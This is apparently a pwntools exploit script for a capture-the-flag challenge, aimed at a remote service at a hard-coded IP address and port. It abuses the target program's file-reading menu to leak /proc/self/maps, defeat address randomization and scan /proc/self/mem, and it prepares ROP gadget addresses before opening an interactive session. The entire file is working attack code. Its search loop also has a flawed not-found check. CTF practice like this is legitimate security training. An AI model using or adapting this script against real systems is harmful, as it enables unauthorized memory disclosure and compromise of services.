from pwn import *
context(arch='amd64', log_level='debug')

libc = ELF('./libc-2.23.so')
pop_rdi_addr = 0x1823
pop_rsi_r15_addr = 0x1821
# io = process('./pwn')
io = remote(b'111.200.241.244', 56025)

def select_file(filename):
	io.sendlineafter(b'5.Exit', b'1')
	io.sendlineafter(b'So man, what are you finding?', filename)

def relocate(offset):
	io.sendlineafter(b'5.Exit', b'2')
	io.sendlineafter(b'So, Where are you?', offset)

def get_something(length):
	io.sendlineafter(b'5.Exit', b'3')
	io.sendlineafter(b'How many things do you want to get?', length)

def write_something(content):
	io.sendlineafter(b'5.Exit', b'4')
	io.sendlineafter(b'content:', content)

io.sendlineafter('Do you want to help me build my room? Y/n?', b'y')
select_file(b'/proc/self/maps')
get_something(b'20000')
io.recvuntil(b'You get something:\n')
map_content = []
for i in range(5):
	map_content.append(io.recvline())

elf_base = int(map_content[0][0:12], 16)
pop_rdi_addr += elf_base
pop_rsi_r15_addr += elf_base
sign = 4
mem_start = int(map_content[sign][0:12], 16)
mem_end = int(map_content[sign][13:25], 16)
print(hex(elf_base))
print(hex(mem_start))
print(hex(mem_end))
select_file('/proc/self/mem')
assert(mem_end - 0xF800000 == mem_start + 0x800000)
# exit(1)
# search_begin = mem_start + 0xFFFFF0 - 24 * 100000
# search_begin = mem_start + 0x800000 - 24 * 100000
search_begin = mem_start + 0x800000 - 24 * 100000
relocate(str(search_begin).encode())
for i in range(24):
	get_something(b'100000')
	content = io.recvuntil(b'1.Find', drop=True)
	if b'/proc/self/mem' in content:
		print('addr found.')
if i == 23:
	print('addr not found.')
	exit(1)

io.interactive()